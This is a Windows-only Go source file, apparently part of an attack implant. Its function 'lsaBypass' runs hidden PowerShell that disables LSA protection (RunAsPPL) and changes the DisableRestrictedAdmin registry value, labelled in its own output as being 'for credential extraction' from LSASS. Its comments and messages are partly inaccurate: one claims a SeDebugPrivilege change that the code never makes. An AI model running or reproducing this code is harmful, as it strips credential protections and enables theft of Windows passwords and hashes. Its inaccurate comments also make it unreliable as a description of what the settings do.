//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
)

func lsaBypass() (string, error) {
	ps := `
$path = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
try {
	$v = Get-ItemProperty -Path $path -Name "RunAsPPL" -ErrorAction Stop
	$current = $v.RunAsPPL
} catch {
	$current = "(not set)"
}

# Disable RunAsPPL (set to 0)
try {
	Set-ItemProperty -Path $path -Name "RunAsPPL" -Value 0 -Type DWord -ErrorAction Stop
	Write-Output "RunAsPPL set to 0 (disabled). Reboot required for full effect."
} catch {
	# Key may not exist; create it
	try {
		New-ItemProperty -Path $path -Name "RunAsPPL" -Value 0 -PropertyType DWord -Force -ErrorAction Stop
		Write-Output "RunAsPPL registry key created and set to 0."
	} catch {
		Write-Output "FAILED: $_"
	}
}
Write-Output "Previous value: $current"
`
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	result := string(out)
	if err != nil {
		result += fmt.Sprintf("\n(powershell error: %v)", err)
	}

	// Also try to add SeDebugPrivilege via registry for LSASS access
	ps2 := `$p="HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"; try { Set-ItemProperty -Path $p -Name "DisableRestrictedAdmin" -Value 0 -Type DWord -Force -ErrorAction Stop; Write-Output "RestrictedAdmin disabled for credential extraction." } catch { }`
	c2 := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps2)
	applyHideWindow(c2)
	c2.Run()

	_ = os.Getpid
	return result, nil
}
